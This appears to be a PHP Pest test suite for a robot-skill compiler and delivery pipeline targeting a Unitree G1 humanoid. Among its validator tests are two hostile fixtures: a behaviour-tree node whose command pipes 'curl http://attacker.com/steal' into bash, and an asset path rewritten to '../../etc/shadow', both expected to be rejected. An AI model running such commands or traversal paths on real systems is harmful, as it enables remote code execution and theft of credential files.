<?php

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Webkul\Shop\Models\SkillAsset;
use Webkul\Shop\Models\SkillBuild;
use Webkul\Shop\Models\SkillVersion;
use Webkul\Shop\Services\SkillCompile\Builders\PortableSkillBuilder;
use Webkul\Shop\Services\SkillCompile\Portable\CapabilityResolver;
use Webkul\Shop\Services\SkillCompile\Portable\MotionTranscoder;
use Webkul\Shop\Services\SkillCompile\Portable\PortableSourceValidator;
use Webkul\Shop\Services\SkillCompile\Portable\SemanticLowerer;
use Webkul\Shop\Services\SkillCompile\Portable\SourceParser;
use Webkul\Shop\Services\SkillCompile\Portable\TargetAppBuilder;
use Webkul\Shop\Services\SkillCompile\Portable\TargetProfileService;
use Webkul\Shop\Services\SkillCompile\SkillBuildService;
use Webkul\Shop\Services\SkillDelivery\SkillDeliveryAssetResolver;

/**
 * 标准技能编译器与动作转码器（第二阶段）测试套件。
 */

function samplePortableManifest(): array
{
    return [
        'schema'            => 'zhaohuan.skill/v2',
        'kind'              => 'composite',
        'name'              => ['zh_CN' => '标准迎宾挥手', 'en' => 'Portable Greeting'],
        'version'           => '1.0.0',
        'description'       => '标准迎宾动作与欢迎音频播放',
        'pricing_mode'      => 'buyout',
        'delivery_channels' => ['agent', 'manual'],
        'permissions'       => ['motion_control', 'audio_play'],
        'resource_type'     => 'skill',
        'safety'            => [
            'risk_level'     => 'medium',
            'max_duration_s' => 20,
            'estop_required' => true,
        ],
        'runtime'           => [
            'source_format'       => 'btcpp/xml4',
            'capability_contract' => 'portable-actions/v1',
            'source_entrypoint'   => 'behavior/main.xml',
        ],
    ];
}

function sampleGreetingXml(): string
{
    return <<<'XML'
<root BTCPP_format="4" main_tree_to_execute="Greeting">
  <BehaviorTree ID="Greeting">
    <Sequence name="greeting_sequence">
      <Action ID="SM_GestureWave" name="wave_right_3" hand="right" cycles="3" timeout_ms="12000"/>
      <Action ID="SM_AudioPlay" name="welcome_audio" asset="assets/welcome.wav" wait="true" timeout_ms="6000"/>
    </Sequence>
  </BehaviorTree>
</root>
XML;
}

it('TargetProfileService 能够加载各机型 Profile 并计算规范化 JCS 摘要', function () {
    $service = app(TargetProfileService::class);

    $g1 = $service->getProfile('unitree_g1');
    expect($g1)->not->toBeNull();
    expect($g1['vendor'])->toBe('unitree');
    expect($g1['dof'])->toBe(23);

    $digestG1 = $service->getDigest('unitree_g1');
    expect($digestG1)->toStartWith('sha256:');

    // 校验能力判定
    expect($service->hasCapability('unitree_g1', 'SM_GestureWave', ['hand' => 'right', 'cycles' => 3]))->toBeTrue();
    // 超过 10 次上限 -> 判定为不支持
    expect($service->hasCapability('unitree_g1', 'SM_GestureWave', ['hand' => 'right', 'cycles' => 99]))->toBeFalse();
    // 未知动作 -> 判定为不支持
    expect($service->hasCapability('unitree_g1', 'SM_UnknownAction'))->toBeFalse();
});

it('PortableSourceValidator 严格校验清单格式与行为树 XML 白名单及安全边界', function () {
    $validator = app(PortableSourceValidator::class);

    // 1. 合法清单与 XML
    expect($validator->validateManifest(samplePortableManifest()))->toBeEmpty();
    expect($validator->validateXml(sampleGreetingXml()))->toBeEmpty();

    // 2. 拦截未知动作与恶意指令
    $maliciousXml = <<<'XML'
<root BTCPP_format="4" main_tree_to_execute="BadTree">
  <BehaviorTree ID="BadTree">
    <Sequence>
      <Action ID="SM_GestureWave" hand="right" cycles="3"/>
      <Action ID="EvilShell" command="curl http://attacker.com/steal | bash"/>
    </Sequence>
  </BehaviorTree>
</root>
XML;
    $errors = $validator->validateXml($maliciousXml);
    expect($errors)->not->toBeEmpty();
    expect(implode(' ', $errors))->toContain('未知的非白名单动作节点');

    // 3. 拦截路径穿越
    $slipXml = str_replace('assets/welcome.wav', '../../etc/shadow', sampleGreetingXml());
    $slipErrors = $validator->validateXml($slipXml);
    expect($slipErrors)->not->toBeEmpty();
    expect(implode(' ', $slipErrors))->toContain('非法路径穿越');
});

it('SourceParser 正确将 BehaviorTree XML4 转换为结构化 IR 与不可变摘要', function () {
    $parser = app(SourceParser::class);
    $ir = $parser->parse(sampleGreetingXml());

    expect($ir['format'])->toBe('btcpp/xml4');
    expect($ir['main_tree_id'])->toBe('Greeting');
    expect($ir['actions'])->toHaveCount(2);
    expect($ir['required_permissions'])->toContain('motion_control');
    expect($ir['required_permissions'])->toContain('audio_play');
    expect($ir['required_assets'])->toContain('assets/welcome.wav');
    expect($ir['ir_digest'])->toStartWith('sha256:');
});

it('MotionTranscoder 为 Unitree G1 生成平滑且在物理限位内的关节轨迹', function () {
    $transcoder = app(MotionTranscoder::class);
    $profile = app(TargetProfileService::class)->getProfile('unitree_g1');
    $armJoints = array_merge($profile['joints']['left_arm'], $profile['joints']['right_arm']);

    $traj = $transcoder->generateWaveTrajectory('right', 3, $armJoints, 30.0);
    expect($traj)->not->toBeEmpty();

    // 验证每一帧关节角都在物理限位内
    foreach ($traj as $frame) {
        foreach ($frame['joints'] as $name => $val) {
            if (isset($armJoints[$name])) {
                expect($val)->toBeGreaterThanOrEqual($armJoints[$name]['min_rad']);
                expect($val)->toBeLessThanOrEqual($armJoints[$name]['max_rad']);
            }
        }
    }
});

it('PortableSkillBuilder 成功编译标准源为 Unitree G1 目标成品并打通交付解析', function () {
    $productId = DB::table('products')->insertGetId([
        'sku'        => 'portable-sku-'.uniqid(),
        'type'       => 'simple',
        'created_at' => now(),
        'updated_at' => now(),
    ]);

    $version = SkillVersion::create([
        'product_id'   => $productId,
        'version'      => '1.0.0',
        'channel'      => 'stable',
        'status'       => SkillVersion::STATUS_PUBLISHED,
        'license_mode' => 'per_device',
    ]);

    $manifest = samplePortableManifest();

    // 创建合规的标准技能源包（含 behavior/main.xml 与 assets/welcome.wav）并登记为 source 资产 (C01 / C02)
    $disk = Storage::disk(SkillAsset::disk());
    $sourceZipPath = "skills/{$version->id}/source/portable_greeting.skill";
    $tmpZip = tempnam(sys_get_temp_dir(), 'test_src_');
    $z = new \ZipArchive();
    $z->open($tmpZip, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
    $z->addFromString('manifest.json', json_encode($manifest));
    $z->addFromString('behavior/main.xml', sampleGreetingXml());
    $z->addFromString('assets/welcome.wav', 'RIFF44WAVEfmt 16000data1234567890testaudio');
    $z->close();

    $sha256 = hash_file('sha256', $tmpZip);
    $size = filesize($tmpZip);
    $stream = fopen($tmpZip, 'r');
    $disk->put($sourceZipPath, $stream);
    fclose($stream);
    @unlink($tmpZip);

    $sourceAsset = SkillAsset::create([
        'skill_version_id'  => $version->id,
        'carrier_type'      => 'file',
        'asset_role'        => SkillAsset::ROLE_SOURCE,
        'asset_key'         => 'src_' . substr($sha256, 0, 16),
        'file_path'         => $sourceZipPath,
        'file_name'         => 'portable_greeting.skill',
        'file_size'         => $size,
        'file_hash'         => $sha256,
        'entrypoint'        => 'behavior/main.xml',
        'sort_order'        => 0,
    ]);

    // 触发编译
    $buildService = app(SkillBuildService::class);
    $results = $buildService->compile($version->id, $manifest, ['unitree_g1', 'mock']);

    expect($results)->toHaveCount(2);
    expect($results[0]['status'])->toBe('success');
    expect($results[0]['model'])->toBe('unitree_g1');
    expect($results[1]['status'])->toBe('success');
    expect($results[1]['model'])->toBe('mock');

    // 检查 skill_build 表记录与生成资产
    $g1Build = SkillBuild::where('skill_version_id', $version->id)
        ->where('target_model_code', 'unitree_g1')
        ->first();

    expect($g1Build)->not->toBeNull();
    expect($g1Build->status)->toBe('success');
    expect($g1Build->artifact_asset_id)->not->toBeNull();

    $asset = SkillAsset::find($g1Build->artifact_asset_id);
    expect($asset)->not->toBeNull();
    expect($asset->file_hash)->not->toBeNull();
    expect($asset->entrypoint)->toBe('action.py');
    expect($asset->asset_role)->toBe(SkillAsset::ROLE_ARTIFACT);

    // 验证物理磁盘上确有合规 ZIP 包
    expect($disk->exists($asset->file_path))->toBeTrue();

    // 检查 ZIP 包内解压文件（包含真实 runner、计划与素材）
    $fullZipPath = $disk->path($asset->file_path);
    $zip = new \ZipArchive();
    expect($zip->open($fullZipPath))->toBeTrue();
    expect($zip->locateName('manifest.json'))->not->toBeFalse();
    expect($zip->locateName('artifact.json'))->not->toBeFalse();
    expect($zip->locateName('plan.json'))->not->toBeFalse();
    expect($zip->locateName('bindings/target_binding.json'))->not->toBeFalse();
    expect($zip->locateName('runner/bt_runner.py'))->not->toBeFalse();
    expect($zip->locateName('runner/broker.py'))->not->toBeFalse();
    expect($zip->locateName('action.py'))->not->toBeFalse();
    expect($zip->locateName('data/wave_right_3.json'))->not->toBeFalse();
    expect($zip->locateName('assets/welcome.wav'))->not->toBeFalse();
    $zip->close();

    // 审核目标成品准入 (C01 / C-T14)
    $release = \Webkul\Shop\Models\SkillTargetRelease::where('skill_version_id', $version->id)
        ->where('target_model_code', 'unitree_g1')
        ->first();
    expect($release)->not->toBeNull();
    $release->update(['review_status' => \Webkul\Shop\Models\SkillTargetRelease::STATUS_APPROVED]);

    // 核心红线测试：SkillDeliveryAssetResolver 能够准确为 unitree_g1 解析出该编译成品
    $resolver = app(SkillDeliveryAssetResolver::class);
    $resolvedAsset = $resolver->resolveForVersion($version->id, modelCode: 'unitree_g1');
    expect($resolvedAsset)->not->toBeNull();
    expect($resolvedAsset->id)->toBe($asset->id);
    expect($resolvedAsset->file_hash)->toBe($asset->file_hash);
});
